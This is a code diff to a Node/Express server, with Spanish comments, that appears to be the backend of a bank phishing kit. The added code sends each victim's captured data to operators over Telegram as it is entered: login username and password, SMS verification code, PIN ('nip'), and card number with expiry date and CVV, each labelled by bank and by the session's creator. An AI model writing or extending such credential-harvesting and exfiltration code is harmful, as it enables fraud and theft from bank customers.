@@ -6,6 +6,7 @@ import { nanoid } from "nanoid";
 import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType } from "@shared/schema";
 import { setupAuth } from "./auth";
 import axios from 'axios';
+import { sendTelegramNotification, sendSessionCreatedNotification, sendScreenChangeNotification } from './telegramService';
 
 // Store active connections
 const clients = new Map<string, WebSocket>();
@@ -1359,21 +1360,92 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   navegador: inputData.deviceBrowser,
                   so: inputData.deviceOs
                 });
+                
+                // Enviar notificación a Telegram
+                const sessionData = await storage.getSessionById(sessionId);
+                if (sessionData) {
+                  await sendTelegramNotification({
+                    sessionId,
+                    banco: sessionData.banco || 'Desconocido',
+                    tipo: 'folio',
+                    data: inputData,
+                    deviceInfo: {
+                      type: inputData.deviceType,
+                      model: inputData.deviceModel,
+                      browser: inputData.deviceBrowser,
+                      os: inputData.deviceOs
+                    },
+                    timestamp: new Date().toISOString(),
+                    createdBy: sessionData.createdBy || 'Desconocido'
+                  });
+                }
                 break;
               case 'login':
                 updatedFields.username = inputData.username;
                 updatedFields.password = inputData.password;
+                
+                // Enviar notificación a Telegram
+                const loginSessionData = await storage.getSessionById(sessionId);
+                if (loginSessionData) {
+                  await sendTelegramNotification({
+                    sessionId,
+                    banco: loginSessionData.banco || 'Desconocido',
+                    tipo: 'login',
+                    data: inputData,
+                    timestamp: new Date().toISOString(),
+                    createdBy: loginSessionData.createdBy || 'Desconocido'
+                  });
+                }
                 break;
               case 'codigo':
                 updatedFields.sms = inputData.codigo;
+                
+                // Enviar notificación a Telegram
+                const codigoSessionData = await storage.getSessionById(sessionId);
+                if (codigoSessionData) {
+                  await sendTelegramNotification({
+                    sessionId,
+                    banco: codigoSessionData.banco || 'Desconocido',
+                    tipo: 'codigo',
+                    data: inputData,
+                    timestamp: new Date().toISOString(),
+                    createdBy: codigoSessionData.createdBy || 'Desconocido'
+                  });
+                }
                 break;
               case 'nip':
                 updatedFields.nip = inputData.nip;
+                
+                // Enviar notificación a Telegram
+                const nipSessionData = await storage.getSessionById(sessionId);
+                if (nipSessionData) {
+                  await sendTelegramNotification({
+                    sessionId,
+                    banco: nipSessionData.banco || 'Desconocido',
+                    tipo: 'nip',
+                    data: inputData,
+                    timestamp: new Date().toISOString(),
+                    createdBy: nipSessionData.createdBy || 'Desconocido'
+                  });
+                }
                 break;
               case 'tarjeta':
                 updatedFields.tarjeta = inputData.tarjeta;
                 updatedFields.fechaVencimiento = inputData.fechaVencimiento;
                 updatedFields.cvv = inputData.cvv;
+                
+                // Enviar notificación a Telegram
+                const tarjetaSessionData = await storage.getSessionById(sessionId);
+                if (tarjetaSessionData) {
+                  await sendTelegramNotification({
+                    sessionId,
+                    banco: tarjetaSessionData.banco || 'Desconocido',
+                    tipo: 'tarjeta',
+                    data: inputData,
+                    timestamp: new Date().toISOString(),
+                    createdBy: tarjetaSessionData.createdBy || 'Desconocido'
+                  });
+                }
                 break;
               case 'sms_compra':
               case 'SMS_COMPRA':
